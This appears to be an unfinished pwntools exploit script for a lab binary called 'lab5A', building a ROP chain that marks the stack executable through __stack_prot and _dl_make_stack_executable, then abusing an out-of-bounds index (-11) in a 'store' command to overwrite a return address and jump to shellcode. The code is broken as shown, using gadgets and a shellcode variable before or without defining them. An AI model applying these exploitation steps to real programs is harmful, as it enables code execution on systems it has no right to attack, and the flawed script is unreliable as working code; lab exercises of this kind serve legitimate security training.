#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386', kernel='amd64')
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'DEBUG'
exe = './lab5A'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#break *0x08048fb4
#break *0x08048e8e
break *0x08048f4c
#break *0x08048ee7
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def overwrite_return(command, ret_address, index):
    number = ret_address
    index = "-11"
    io.sendline(command)
    io.sendline(ret_address)
    io.sendline(index)

exe = ELF(exe)
rop = ROP(exe)
io = start()

rop.raw(pop_eax.address) #1
rop.raw(exe.sym.__stack_prot)
rop.raw(pop_edx.address)
rop.raw(0x7)
rop.raw(0x805544c)
#0x0805544c : mov dword ptr [eax + 4], edx ; xor eax, eax ; pop ebx ; pop esi ; ret



#Write stack executable ROP chain
command = "store"
index = "1"
#io.sendline
#Old ROP Chain
"""
rop.raw(pop_eax.address)
rop.raw(0x7)
rop.raw(pop_edx.address)
rop.raw(exe.sym.__stack_prot)
rop.raw(0x0809a95d) #:mov dword ptr [edx], eax ; ret

#Call _dl_make_stack_executable
rop.raw(pop_eax.address)
rop.raw(exe.sym.__libc_stack_end)
rop.call(exe.sym._dl_make_stack_executable)
rop.raw(0x080de6cf) #: jmp esp
rop.raw(0x90909090) # NOP sled
rop.raw(payload)
print(rop.dump())
"""


#Write shellcode out to data structure
command = "store"
#shellcode = str(int(0x01))
index = "1"

io.sendline(command)
io.sendline(shellcode)
io.sendline(index)
io.interactive() #DEBUG

#Overwrite return address in store_number
ret_address = str(int(0x08049bb7)) #: add esp, 0x2c ; ret 
#ret_address = str(int(0x080a50d0)) #add esp, 0x3c ; ret 
overwrite_return(command, ret_address, "-11")

rop = ROP(exe)
pop_eax = rop.find_gadget(["pop eax", "ret"])
pop_edx = rop.find_gadget(["pop edx", "ret"])






# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

